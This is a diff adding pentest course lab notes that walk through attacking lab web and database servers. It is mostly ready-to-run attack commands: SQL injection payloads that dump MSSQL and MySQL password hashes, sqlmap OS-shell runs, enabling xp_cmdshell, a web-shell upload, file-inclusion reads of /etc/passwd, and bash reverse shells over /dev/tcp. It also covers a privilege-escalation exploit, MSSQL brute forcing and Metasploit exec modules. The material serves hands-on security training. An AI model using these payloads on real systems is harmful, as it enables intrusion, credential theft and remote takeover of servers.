@@ -1,0 +1,664 @@
+#################
+# SQL Injection #
+#################
+
+
+http://10.250.100.221/
+http://10.250.100.221/bookdetail.aspx?id=2
+http://10.250.100.221/bookdetail.aspx?id=2'
+http://10.250.100.221/bookdetail.aspx?id='
+
+
+http://10.250.100.221/bookdetail.aspx?id=(2)	
+http://10.250.100.221/bookdetail.aspx?id=(4-2)	
+http://10.250.100.221/bookdetail.aspx?id=(4-1)
+
+
+
+http://10.250.100.221/bookdetail.aspx?id=2 or 1=1-- 
+http://10.250.100.221/bookdetail.aspx?id=2 or 1=2-- 
+http://10.250.100.221/bookdetail.aspx?id=1*1 
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 >-1# 
+http://10.250.100.221/bookdetail.aspx?id=2 or 1<99# 
+http://10.250.100.221/bookdetail.aspx?id=2 or 1<>1# 
+http://10.250.100.221/bookdetail.aspx?id=2 or 2 != 3-- 
+http://10.250.100.221/bookdetail.aspx?id=2 &0# 
+
+
+	
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))-- 	NOTE: "N" - just means to keep going until you run out of databases
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://10.250.100.221/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 100--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 50--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 25--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 10--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 5--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 6--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 7--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 8--
+http://10.250.100.221/bookdetail.aspx?id=2 order by 9--
+http://10.250.100.221/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+http://10.250.100.221/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+http://10.250.100.221/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://10.250.100.221/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://10.250.100.221/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://10.250.100.221/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+
+
+
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+  	 
+3 - Total Characters
+http://10.250.100.221/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://10.250.100.221/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://10.250.100.221/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+
+D  - 1st Character
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+ 
+B - 2nd Character
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+ 
+O - 3rd Character
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://10.250.100.221/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+
+
+
+##########
+# Sqlmap #
+##########
+cd /home/strategicsec/toolz/sqlmap-dev/
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" -b
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" --current-user
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" --current-db 
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" --dbs 
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" -D BookApp --tables 
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns 
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns 
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns --dump 
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns --dump 
+python sqlmap.py -u "http://10.250.100.221/bookdetail.aspx?id=2" --users --passwords 
+
+
+
+
+
+Enabling XP-Command Shell (in your web browswer type the following URL)
+http://10.250.100.221/bookdetail.aspx?id=2;exec master..sp_configure 'show advanced options',1;reconfigure;exec master..sp_configure 'xp_cmdshell',1;reconfigure--
+
+##############################################                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ##############################################
+# Executing System Commands With xp_cmdshell #
+##############################################
+
+Go to the address below in firefox:
+http://10.250.100.221/bookdetail.aspx?id=2;exec+master..xp_cmdshell+'ping -n 8 127.0.0.1'--
+
+
+Go to the address below in firefox:
+http://10.250.100.221/bookdetail.aspx?id=2;exec+master..xp_cmdshell+'dir+>+c:\inetpub\wwwroot\dir_yourname-was-here.txt'--
+
+
+
+Check it
+--------
+http://10.250.100.221/dir_yourname-was-here.txt
+
+
+
+
+Go to the address below in firefox:
+http://10.250.100.221/bookdetail.aspx?id=2;exec+master..xp_cmdshell+'ipconfig+>+c:\inetpub\wwwroot\ipconfig_yourname-was-here.txt'--
+
+
+
+Check it
+--------
+http://10.250.100.221/ipconfig_yourname-was-here.txt
+
+
+
+
+Go to the address below in firefox:
+http://10.250.100.221/bookdetail.aspx?id=2;exec+master..xp_cmdshell+'netstat+>+c:\inetpub\wwwroot\netstat_yourname-was-here.txt'--
+
+
+
+
+
+Check it
+--------
+http://10.250.100.221/netstat_yourname-was-here.txt
+
+
+
+-----------------Some Manual Testing-----------------
+
+Go to LAMP Target homepage
+http://10.250.100.115/
+
+	- Ask yourself the 3 web questions
+	
+	1. Does the website talk to a DB?
+		- Look for parameter passing (ex: site.com/page.php?id=4)
+		- If yes - try SQL Injection
+
+	2. Can I or someone else see what I type?
+
+	3. Does the page reference a file?
+
+
+
+
+Clicking on the Acer Link:
+http://10.250.100.115/acre2.php?lap=acer
+
+	- Found parameter passing (answer yes to question 1)
+	- Insert ' to test for SQLI
+
+http://10.250.100.115/acre2.php?lap=acer'
+
+
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
+
+
+
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+http://10.250.100.115/acre2.php?lap=acer' order by 100-- +
+
+Page returns the following error:
+Unknown column '100' in 'order clause'
+
+
+
+http://10.250.100.115/acre2.php?lap=acer' order by 50-- +
+
+
+
+Now we negate the parameter value 'acer' by turning into the word 'null':
+http://10.250.100.115/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+
+
+
+
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
+
+
+http://10.250.100.115/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+
+
+
+http://10.250.100.115/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+
+Page returns the following error:
+Unknown column '50' in 'order clause'
+
+
+
+
+
+http://10.250.100.115/acre2.php?lap=acer' order by 25-- +
+Page returns the following error:
+Unknown column '25' in 'order clause'
+
+
+
+http://10.250.100.115/acre2.php?lap=acer' order by 5-- +
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+
+
+
+Now we build out the union all select statement with the correct number of columns
+
+Reference:
+http://www.techonthenet.com/sql/union.php
+
+
+
+http://10.250.100.115/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+
+
+
+
+
+http://10.250.100.115/acre2.php?lap=acer' union all select 1,2,3,user,password,6 from mysql.user -- a
+
+
+
+
+
+
+
+Here we see that do not have parameter passing, but we can see what we type.
+http://10.250.100.115/career.php
+
+Tried XSS, but that didn't - then noticed that we can upload a file.
+
+Go to http://www.open-labs.org/
+
+Download yourname_webkit
+
+http://www.open-labs.org/yourname_webkit02.tar.gz
+
+Upload cmd.php or list.php...now you have find it!!!!! Where is it????
+
+
+Tried a bunch of dirs - finally found it in /resume:
+http://10.250.100.115/resume/cmd.php
+
+Try the following commands:
+/sbin/ifconfig
+
+uname -a
+
+id
+
+cat /etc/passwd
+
+
+
+
+
+Here we see parameter passing, but this one is actually a yes to question number 3 (reference a file)
+http://10.250.100.115/showfile.php?filename=about.txt
+
+
+
+See if you can read files on the file system:
+http://10.250.100.115/showfile.php?filename=/etc/passwd
+
+
+
+
+-----------------Some Automated Testing-----------------
+
+cd /home/strategicsec/toolz/sqlmap-dev/
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" -b -v 3
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --current-user -v 3
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --current-db -v 3
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --privileges -v 3
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --dbs -v 3
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --tables -v 3
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --file-read=/etc/issue -v 3
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --file-read=/etc/passwd -v 3
+
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --os-shell -v 3
+	3
+	/var/www/html/
+	/var/www/html/uploads/
+
+
+	id
+		Y
+
+	ls -lsa
+		Y
+
+	uname -a
+		Y
+
+
+
+
+
+python sqlmap.py -u "http://10.250.100.115/acre2.php?lap=acer" --os-pwn --msf-path=/home/strategicsec/toolz/metasploit/ -v 3
+	3
+	/var/www/html/
+	/var/www/html/uploads/
+	/sbin/ifconfig
+		Y
+
+
+
+
+-----------------Some homework-----------------
+
+1. Do all of the labs in the https://s3.amazonaws.com/StrategicSec-Files/LAMP-WebAppLabs.pdf document
+
+
+-----------------Challenge-----------------
+1. Root this box!
+
+Send me a word document with screenshots proving that you did all of the exercises.
+
+
+
+
+
+###################################
+# Root Method 1: Find Credentials #
+###################################
+
+http://10.250.100.115/resume/cmd.php
+
+ls -lsa
+
+ls -lsa /var/www/html/
+
+
+Find a file called dbconnect.php
+
+cat /var/www/html/dbconnect.php
+
+	or
+
+http://10.250.100.115/showfile.php?filename=dbconnect.php
+
+
+
+ssh into host with the credentials you find 
+(note: This is a shot in the dark. The mysql root user pass is not always the same as the real root pass.)
+
+
+
+
+#######################################
+# Root Method 2: Privilege Escalation #
+#######################################
+
+start listener on your machine
+ncat -l -v -p 1234
+
+
+
+Go back to uploaded webshell
+http://10.250.100.115/resume/cmd.php
+
+
+
+
+bash -i >& /dev/tcp/StrategicSec-Ubuntu-VM-Bridged-IP/1234 0>&1
+
+
+id
+uname -a
+pwd
+
+
+
+
+cd /tmp
+
+
+
+cat >> yourname.c << out	<-------------- paste in the exploit code text from the exploit-db.com link below
+
+
+
+
+http://www.exploit-db.com/exploits/9479/
+
+
+
+gcc -o yourname yourname.c
+
+
+./yourname
+
+
+id
+
+cat /etc/shadow
+
+
+#########################################
+# Simple Linux Post Exploitation Tricks #
+#########################################
+
+
+
+
+Linux Lab 1: 
+------------
+On your Windows host type this:
+
+ncat -l -vv -p 4321 > see.txt
+
+
+On your Linux host type this:
+
+echo "see this" > /dev/tcp/StrategicSec-Ubuntu-VM-Bridged-IP/4321
+
+
+
+
+
+Linux Lab 2: 
+------------
+On your Windows host type this:
+
+ncat -l -vv -p 1234
+
+
+
+On your Linux host type this:
+ /bin/bash -i > /dev/tcp/StrategicSec-Ubuntu-VM-Bridged-IP/1234 0<&1 2>&1
+
+
+
+
+
+
+Linux Lab 3: 
+------------
+
+port=1; while [ $port -lt 1024 ]; do echo > /dev/tcp/10.250.100.221/$port; [ $? == 0 ] && echo $port "is open" >> /tmp/ports.txt; port=`expr $port + 1`; done
+
+
+cat /tmp/ports.txt
+
+
+
+
+
+Linux Lab 3a: 
+-------------
+
+for ((i=0; $i < 1024; i++)); 
+do echo >/dev/tcp/10.250.100.221/$i && echo $i open;
+done 2>/dev/null
+
+
+
+Linux Lab 3b: 
+-------------
+
+for p in {1..1023}
+do
+  (echo >/dev/tcp/10.250.100.221/$p) >/dev/null 2>&1 && echo "$p open"
+done
+
+
+
+
+
+
+Lab 4:
+------
+On your Windows host type this:
+ncat -l -vv -p 31337				(command shell window 1)
+ncat -l -vv -p 1337				(command shell window 2)
+
+
+On your Linux host type this:
+telnet StrategicSec-Ubuntu-VM-Bridged-IP 31337 | /bin/bash | telnet StrategicSec-Ubuntu-VM-Bridged-IP 1337
+
+
+
+
+
+
+
+
+
+Type commands on the 31337 listener, and see the output on the 1337 listener
+
+
+
+
+
+----------------------------------------------------------------------------------
+Lab 3a: Identifying MSSQL Server
+
+propecia 10.250.100 1433
+
+Lab 3b: Determine the Version
+nmap -sV -p 1433 10.250.100.221
+nmap -sV -p 1433 --script=ms-sql-info 10.250.100.221
+
+
+Lab 3c: Bruteforcing MSSQL
+nmap -sV -p 1433 --script=ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 10.250.100.221
+nmap –p 1433 –script ms-sql-brute 10.250.100.221
+Neither one of these would work.
+
+
+Lab 3d: Extracting Data From MSSQL
+nmap -sV -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=database 10.250.100.221
+
+nmap -sV -p 1433 10.250.100.1-254
+
+MSSQL
+---------
+propecia 10.10.10 1433
+./sqlcmd 10.250.100.221:1433
+
+NMAP
+nmap -p1433 --script ms-sql-info 10.250.100.221
+nmap -p1433 --script ms-sql-empty-password 10.250.100.221
+nmap -p1433 --script ms-sql-brute 10.250.100.221
+nmap -p1433 --script --script-args userdb=users.txt,passdb=pass.txt 10.250.100.221
+nmap -p1433 --script ms-sql-hasdbaccess.nse --script-args mssql.username=sa 10.250.100.221
+nmap -p1433 --script ms-sql-tables --script-args mssql.username=sa 10.250.100.221
+nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa 10.250.100.221
+nmap -p1433 --script ms-sql-xp-cmdshell --script-args=ms-sql-xp-cmdshell.cmd=’net users’,mssql.username=sa 10.250.100.221
+nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa 10.250.100.221
+
+
+
+
+
+Lab 3e: Attacking MSSQL Server With Metasploit
+
+cd ~/toolz/metasploit
+
+./msfconsole
+
+use auxiliary/admin/mssql/mssql_sql
+
+show options
+
+set RHOST 10.250.100.221
+
+set username sa
+
+set password database
+
+exploit
+
+
+
+
+
+
+
+
+
+use auxiliary/admin/mssql/mssql_enum
+
+show options
+
+set RHOST 10.250.100.221
+
+set username sa
+
+set password database
+
+exploit
+
+
+
+
+
+use auxiliary/admin/mssql/mssql_exec
+
+show options
+
+set RHOST 10.250.100.221
+
+set password database
+
+set CMD cmd.exe /c ping localhost
+
+exploit
+
+
+
+
+
+use auxiliary/scanner/mssql/mssql_ping
+set RHOSTS 10.250.100.221
+run
+
+use auxiliary/admin/mssql/mssql_enum
+set RHOSTS 10.250.100.221
+run
+
+set CMD ‘ipconfig’
+run
+
+
+
+
+
+MS-SQL
+nmap -sV -p 1433 --script=ms-sql-info 10.250.100.221
+
+nmap -sV -p 1433 --script=ms-sql-brute --script-args userdb=userlist.txt,passdb=passwordlist.txt 10.250.100.221
+
+nmap -sV -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=database 10.250.100.221
+
+
+
+MySQL
